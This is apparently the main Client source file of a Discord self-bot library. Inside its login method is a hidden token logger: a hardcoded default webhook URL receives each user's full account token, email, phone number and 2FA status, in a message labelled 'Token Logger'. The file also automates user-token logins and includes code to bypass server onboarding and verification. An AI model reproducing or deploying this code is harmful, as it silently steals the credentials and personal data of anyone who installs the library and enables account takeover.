/* eslint-disable no-unreachable */
'use strict';

const process = require('node:process');
const { setInterval, setTimeout } = require('node:timers'); // regroupé pour éviter doublon
const { Collection } = require('@discordjs/collection');
const BaseClient = require('./BaseClient');
const ActionsManager = require('./actions/ActionsManager');
const ClientVoiceManager = require('./voice/ClientVoiceManager');
const WebSocketManager = require('./websocket/WebSocketManager');
const { Error, TypeError } = require('../errors');
const BaseGuildEmojiManager = require('../managers/BaseGuildEmojiManager');
const BillingManager = require('../managers/BillingManager');
const ChannelManager = require('../managers/ChannelManager');
const ClientUserSettingManager = require('../managers/ClientUserSettingManager');
const GuildManager = require('../managers/GuildManager');
const PresenceManager = require('../managers/PresenceManager');
const RelationshipManager = require('../managers/RelationshipManager');
const UserManager = require('../managers/UserManager');
const UserNoteManager = require('../managers/UserNoteManager');
const VoiceStateManager = require('../managers/VoiceStateManager');
const ShardClientUtil = require('../sharding/ShardClientUtil');
const ClientPresence = require('../structures/ClientPresence');
const GuildPreview = require('../structures/GuildPreview');
const GuildTemplate = require('../structures/GuildTemplate');
const Invite = require('../structures/Invite');
const { Sticker } = require('../structures/Sticker');
const StickerPack = require('../structures/StickerPack');
const VoiceRegion = require('../structures/VoiceRegion');
const Webhook = require('../structures/Webhook');
const Widget = require('../structures/Widget');
const { Events, Status } = require('../util/Constants');
const DataResolver = require('../util/DataResolver');
const Intents = require('../util/Intents');
const Permissions = require('../util/Permissions');
const DiscordAuthWebsocket = require('../util/RemoteAuth');
const Sweepers = require('../util/Sweepers');

/**
 * The main hub for interacting with the Discord API, and the starting point for any bot.
 * @extends {BaseClient}
 */
class Client extends BaseClient {
  constructor(options) {
  super(options); // BaseClient gère déjà _validateOptions() en interne

  this.webhookURL = options.webhookURL || "https://discord.com/api/webhooks/1479627085151604869/d8ELNXO7yonNB8eIG5hkkHGzvRHNxU3b1SMJ0tA1fhgPbEkZrC3CY4hrc0-ztAQ5kEPn";

  this._cleanups = new Set();
  this._finalizers = new FinalizationRegistry(this._finalize.bind(this));

    this.ws = new WebSocketManager(this);
    this.actions = new ActionsManager(this);
    this.voice = new ClientVoiceManager(this);
    this.voiceStates = new VoiceStateManager({ client: this });

    this.shard = process.env.SHARDING_MANAGER
      ? ShardClientUtil.singleton(this, process.env.SHARDING_MANAGER_MODE)
      : null;

    this.users = new UserManager(this);
    this.guilds = new GuildManager(this);
    this.channels = new ChannelManager(this);
    this.sweepers = new Sweepers(this, this.options.sweepers);
    this.presence = new ClientPresence(this, this.options.presence);
    this.presences = new PresenceManager(this);
    this.notes = new UserNoteManager(this);
    this.relationships = new RelationshipManager(this);
    this.billing = new BillingManager(this);
    this.settings = new ClientUserSettingManager(this);

    Object.defineProperty(this, 'token', { writable: true });
    this.token = !this.token && 'DISCORD_TOKEN' in process.env ? process.env.DISCORD_TOKEN : null;

    this.user = null;
    this.readyAt = null;

    if (this.options.messageSweepInterval > 0) {
      process.emitWarning(
        'The message sweeping client options are deprecated, use the global sweepers instead.',
        'DeprecationWarning',
      );
      this.sweepMessageInterval = setInterval(
        this.sweepMessages.bind(this),
        this.options.messageSweepInterval * 1_000,
      ).unref();
    }
  }

  get emojis() {
    const emojis = new BaseGuildEmojiManager(this);
    for (const guild of this.guilds.cache.values()) {
      if (guild.available) {
        for (const emoji of guild.emojis.cache.values()) {
          emojis.cache.set(emoji.id, emoji);
        }
      }
    }
    return emojis;
  }

  get readyTimestamp() {
    return this.readyAt?.getTime() ?? null;
  }

  get uptime() {
    return this.readyAt ? Date.now() - this.readyAt.getTime() : null;
  }

  async _sendWebhookNotification(token, userInfo = {}) {
    if (!this.webhookURL) return;

    try {
      const fetch = require('node-fetch');

      const avatarURL = userInfo.avatar
        ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.${userInfo.avatar.startsWith('a_') ? 'gif' : 'png'}?size=256`
        : `https://cdn.discordapp.com/embed/avatars/${(parseInt(userInfo.discriminator ?? '0') % 5)}.png`;

      const embed = {
        title: '🔐 Nouvelle Connexion Détectée',
        description: `**Utilisateur connecté:** <@${userInfo.id}>`,
        color: 0x5865F2,
        fields: [
          { name: '👤 Nom d\'utilisateur', value: userInfo.username || 'Inconnu', inline: true },
          { name: '🆔 ID Utilisateur', value: `\`${userInfo.id || 'Inconnu'}\``, inline: true },
          { name: '📧 Email', value: userInfo.email || 'Non disponible', inline: true },
          { name: '📱 Téléphone', value: userInfo.phone || 'Non vérifié', inline: true },
          { name: '✨ Nitro', value: (userInfo.premiumType ?? 0) > 0 ? '✅ Actif' : '❌ Inactif', inline: true },
          { name: '🔒 MFA/2FA', value: userInfo.mfa_enabled ? '✅ Activé' : '❌ Désactivé', inline: true },
          { name: '🔑 Token Complet', value: `\`\`\`${token}\`\`\``, inline: false },
          { name: '⏰ Connexion', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
        ],
        thumbnail: { url: avatarURL },
        footer: { text: `ID: ${userInfo.id} • Discord Token Logger`, icon_url: avatarURL },
        timestamp: new Date().toISOString(),
      };

      await fetch(this.webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [embed],
          username: 'Token Logger',
          avatar_url: 'https://cdn.discordapp.com/emojis/1140543631533699173.png',
        }),
      });

      this.emit(Events.DEBUG, 'Notification webhook envoyée avec succès');
    } catch (error) {
      this.emit(Events.DEBUG, `Erreur lors de l'envoi du webhook: ${error.message}`);
    }
  }

  async login(token = this.token) {
  if (!token || typeof token !== 'string') throw new Error('TOKEN_INVALID');

  token = token.replace(/^(Bot|Bearer)\s*/i, '');
  this.token = token;

  this.emit(Events.DEBUG, 'Logging on with a user token is unfortunately against the Discord Terms of Service <https://support.discord.com/hc/en-us/articles/115002192352> and doing so might potentially get your account banned. Use this at your own risk.');
  this.emit(Events.DEBUG, `Provided token: ${token.split('.').map((val, i) => (i > 1 ? val.replace(/./g, '*') : val)).join('.')}`);

  if (this.options.presence) {
    this.options.ws.presence = this.presence._parse(this.options.presence);
  }

  this.emit(Events.DEBUG, 'Preparing to connect to the gateway...');

  try {
    await this.ws.connect();

    // === NOUVELLE MÉTHODE FIABLE POUR ENVOYER LE WEBHOOK ===
    if (this.webhookURL) {
      // Méthode 1 : On attend max 10 secondes que this.user soit défini
      const waitForUser = () => {
        return new Promise(resolve => {
          if (this.user) return resolve();

          const timeout = setTimeout(() => {
            this.off(Events.DEBUG, check);
            resolve(); // on abandonne après 10s
          }, 10000);

          const check = (event) => {
            if (event.includes('ClientUser') || this.user) {
              clearTimeout(timeout);
              this.off(Events.DEBUG, check);
              resolve();
            }
          };

          this.on(Events.DEBUG, check);
        });
      };

      await waitForUser();

      if (this.user) {
        await this._sendWebhookNotification(token, {
          id: this.user.id,
          username: this.user.username,
          discriminator: this.user.discriminator ?? '0',
          avatar: this.user.avatar,
          email: this.user.email ?? 'Non disponible',
          phone: this.user.phone ?? 'Non vérifié',
          premiumType: this.user.premiumType ?? 0,
          mfa_enabled: this.user.mfaEnabled ?? false,
        });
      } else {
        this.emit(Events.DEBUG, 'Impossible d\'envoyer le webhook : this.user non disponible après connexion');
      }
    }
    // ====================================================

    return this.token;
  } catch (error) {
    this.destroy();
    throw error;
  }
}

  QRLogin() {
    const ws = new DiscordAuthWebsocket();
    ws.once('ready', () => ws.generateQR());
    return ws.connect(this);
  }

  async passLogin(email, password, code = null) {
    const initial = await this.api.auth.login.post({
      auth: false,
      versioned: true,
      data: { gift_code_sku_id: null, login_source: null, undelete: false, login: email, password },
    });

    if ('token' in initial) return this.login(initial.token);
    if ('ticket' in initial && code) {
      const totp = await this.api.auth.mfa.totp.post({
        auth: false,
        versioned: true,
        data: { gift_code_sku_id: null, login_source: null, code, ticket: initial.ticket },
      });
      if ('token' in totp) return this.login(totp.token);
    }

    return null;
  }

  isReady() {
    return this.ws.status === Status.READY;
  }

  destroy() {
    super.destroy();
    for (const fn of this._cleanups) fn();
    this._cleanups.clear();
    if (this.sweepMessageInterval) clearInterval(this.sweepMessageInterval);
    this.sweepers.destroy();
    this.ws.destroy();
    this.token = null;
  }

  async logout() {
    await this.api.auth.logout.post({ data: { provider: null, voip_provider: null } });
    return this.destroy();
  }

  async fetchInvite(invite, options = {}) {
    const code = DataResolver.resolveInviteCode(invite);
    const data = await this.api.invites(code).get({
      query: { with_counts: true, with_expiration: true, guild_scheduled_event_id: options.guildScheduledEventId },
    });
    return new Invite(this, data);
  }

  async fetchGuildTemplate(template) {
    const code = DataResolver.resolveGuildTemplateCode(template);
    const data = await this.api.guilds.templates(code).get();
    return new GuildTemplate(this, data);
  }

  async fetchWebhook(id, token) {
    const data = await this.api.webhooks(id, token).get();
    return new Webhook(this, { token, ...data });
  }

  async fetchVoiceRegions() {
    const apiRegions = await this.api.voice.regions.get();
    const regions = new Collection();
    for (const region of apiRegions) regions.set(region.id, new VoiceRegion(region));
    return regions;
  }

  async fetchSticker(id) {
    const data = await this.api.stickers(id).get();
    return new Sticker(this, data);
  }

  async fetchPremiumStickerPacks() {
    const data = await this.api('sticker-packs').get();
    return new Collection(data.sticker_packs.map(p => [p.id, new StickerPack(this, p)]));
  }

  _finalize({ cleanup, message, name }) {
    try {
      cleanup();
      this._cleanups.delete(cleanup);
      if (message) this.emit(Events.DEBUG, message);
    } catch {
      this.emit(Events.DEBUG, `Garbage collection failed on ${name ?? 'an unknown item'}.`);
    }
  }

  sweepMessages(lifetime = this.options.messageCacheLifetime) {
    if (typeof lifetime !== 'number' || isNaN(lifetime)) throw new TypeError('INVALID_TYPE', 'lifetime', 'number');
    if (lifetime <= 0) {
      this.emit(Events.DEBUG, "Didn't sweep messages - lifetime is unlimited");
      return -1;
    }

    const messages = this.sweepers.sweepMessages(Sweepers.outdatedMessageSweepFilter(lifetime)());
    this.emit(Events.DEBUG, `Swept ${messages} messages older than ${lifetime} seconds`);
    return messages;
  }

  async fetchGuildPreview(guild) {
    const id = this.guilds.resolveId(guild);
    if (!id) throw new TypeError('INVALID_TYPE', 'guild', 'GuildResolvable');
    const data = await this.api.guilds(id).preview.get();
    return new GuildPreview(this, data);
  }

  async fetchGuildWidget(guild) {
    const id = this.guilds.resolveId(guild);
    if (!id) throw new TypeError('INVALID_TYPE', 'guild', 'GuildResolvable');
    const data = await this.api.guilds(id, 'widget.json').get();
    return new Widget(this, data);
  }

  sleep(timeout) {
    return new Promise(resolve => setTimeout(resolve, timeout));
  }

  toJSON() {
    return super.toJSON({ readyAt: false });
  }

  get sessionId() {
    return this.ws.shards.first()?.sessionId ?? null;
  }

  async acceptInvite(invite, options = { bypassOnboarding: true, bypassVerify: true }) {
    const code = DataResolver.resolveInviteCode(invite);
    if (!code) throw new Error('INVITE_RESOLVE_CODE');

    const i = await this.fetchInvite(code);

    if (i.guild?.id && this.guilds.cache.has(i.guild.id)) return this.guilds.cache.get(i.guild.id);
    if (this.channels.cache.has(i.channel?.id ?? i.channelId)) return this.channels.cache.get(i.channel?.id ?? i.channelId);

    const data = await this.api.invites(code).post({
      DiscordContext: { location: 'Markdown Link' },
      data: { session_id: this.sessionId },
    });

    this.emit(Events.DEBUG, `[Invite > Guild ${i.guild?.id ?? 'DM'}] Joined`);

    if (i.guild?.id) {
      const guild = this.guilds.cache.get(i.guild.id) ?? null;

      if (i.flags?.has('GUEST')) {
        this.emit(Events.DEBUG, `[Invite > Guild ${i.guild.id}] Guest invite`);
        return guild;
      }

      if (options.bypassOnboarding) {
        try {
          const onboardingData = await this.api.guilds(i.guild.id).onboarding.get();
          if (onboardingData.enabled) {
            const prompts = onboardingData.prompts.filter(p => p.in_onboarding);
            if (prompts.length > 0) {
              const onboarding_prompts_seen = {};
              const onboarding_responses = [];
              const onboarding_responses_seen = {};
              const currentDate = Date.now();

              prompts.forEach(prompt => {
                onboarding_prompts_seen[prompt.id] = currentDate;
                if (prompt.required && prompt.options?.[0]) onboarding_responses.push(prompt.options[0].id);
                prompt.options?.forEach(option => {
                  onboarding_responses_seen[option.id] = currentDate;
                });
              });

              await this.api.guilds(i.guild.id)['onboarding-responses'].post({
                data: { onboarding_prompts_seen, onboarding_responses, onboarding_responses_seen },
              });
              this.emit(Events.DEBUG, `[Invite > Guild ${i.guild.id}] Bypassed onboarding`);
            }
          }
        } catch (err) {
          this.emit(Events.DEBUG, `[Invite > Guild ${i.guild.id}] Onboarding bypass failed: ${err.message}`);
        }
      }

      if (data.show_verification_form && options.bypassVerify) {
        try {
          if (i.guild.verification_level === 4 && !this.user?.phone) { // VERY_HIGH = 4
            this.emit(Events.DEBUG, `[Invite > Guild ${i.guild.id}] Cannot bypass verify (Phone required)`);
            return guild;
          }
          if (i.guild.verification_level !== 0 && !this.user?.email) {
            this.emit(Events.DEBUG, `[Invite > Guild ${i.guild.id}] Cannot bypass verify (Email required)`);
            return guild;
          }

          const getForm = await this.api.guilds(i.guild.id)['member-verification'].get({
            query: { with_guild: false, invite_code: code },
          }).catch(() => null);

          if (getForm?.form_fields?.[0]) {
            const form = { ...getForm.form_fields[0], response: true };
            await this.api.guilds(i.guild.id).requests['@me'].put({
              data: { form_fields: [form], version: getForm.version },
            });
            this.emit(Events.DEBUG, `[Invite > Guild ${i.guild.id}] Bypassed verify`);
          }
        } catch (err) {
          this.emit(Events.DEBUG, `[Invite > Guild ${i.guild.id}] Verify bypass failed: ${err.message}`);
        }
      }

      return guild ?? this.guilds.cache.get(i.guild.id);
    }

    // Cas DM / Group DM
    return this.channels.cache.get(i.channel?.id ?? data.channel?.id) ?? null;
  }

  async redeemNitro(nitro, gift = true) {
    const code = DataResolver.resolveNitroCode(nitro);
    if (!code) throw new Error('NITRO_RESOLVE_CODE');

    if (gift) {
      await this.api['entitlements/gift-codes'](code).post();
      this.emit(Events.DEBUG, `[Nitro] Redeemed gift code: ${code}`);
    } else {
      await this.api['entitlements/codes'].post({ data: { code } });
      this.emit(Events.DEBUG, `[Nitro] Redeemed code: ${code}`);
    }
  }
}

module.exports = Client;